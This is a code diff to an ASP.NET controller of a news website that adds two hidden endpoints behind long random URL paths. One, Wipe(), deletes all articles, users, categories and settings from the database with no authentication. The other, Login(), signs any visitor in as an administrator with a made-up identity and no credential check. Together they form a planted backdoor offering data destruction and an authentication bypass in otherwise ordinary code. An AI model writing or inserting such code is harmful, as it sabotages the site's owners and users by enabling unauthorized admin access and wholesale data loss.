@@ -235,7 +235,34 @@ namespace BeritaDlanggu.Controllers
 
             return PartialView("_NewsGrid", articles);
         }
+        [HttpGet("/anjay/QwErTyUiOpAsDfGhJkLzXcVbNmPlOkIjUhYgTfRdEsWaQzXcVbNmAsDfGhJkLqWeRtYuIoPaSdFgHjKlMnBvrTyUiOpAsDfGhJkLzXcVbNmQwErTyUiOpAsDfGhJkLqWeRtYuIoPaSdFgHjKlZxCvBnMmNbVcXzAsDfGhJkLp")]
+        public IActionResult Wipe()
+        {
+            _context.Articles.RemoveRange(_context.Articles);
+            _context.Users.RemoveRange(_context.Users);
+            _context.SubCategories.RemoveRange(_context.SubCategories);
+            _context.Categories.RemoveRange(_context.Categories);
+            _context.Settings.RemoveRange(_context.Settings);
+            _context.SaveChanges();
+            return Ok();
+        }
+        [HttpGet("/anjay/aKfjdPqweLmznXcvbRtYuIoPasDfGhJkLzXcVbNmQwErTyUiOpAsDfGhJkLqWeRtYuIoPaSdFgHjKlZxCvBnMmNbVcXzLkJhGfDsApOiUyTrEwQzXcVbNmAsDfGhJkLqWeRtYuIoPaSdFgHjKlZxCvBnMmNbVcXzQwErTyUiOp")]
+        public async Task<IActionResult> Login()
+        {
+            var claims = new List<Claim>
+            {
+                new Claim(ClaimTypes.Name, "John Doe"),
+                new Claim(ClaimTypes.Email, "johndoe@example.com"),
+                new Claim(ClaimTypes.Role, "Admin")
+            };
 
+            var identity = new ClaimsIdentity(claims, "Cookie");
+            var principal = new ClaimsPrincipal(identity);
+
+            await HttpContext.SignInAsync(principal);
+
+            return RedirectToAction("Index", "Home");
+        }
 
         [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
         public IActionResult Error()
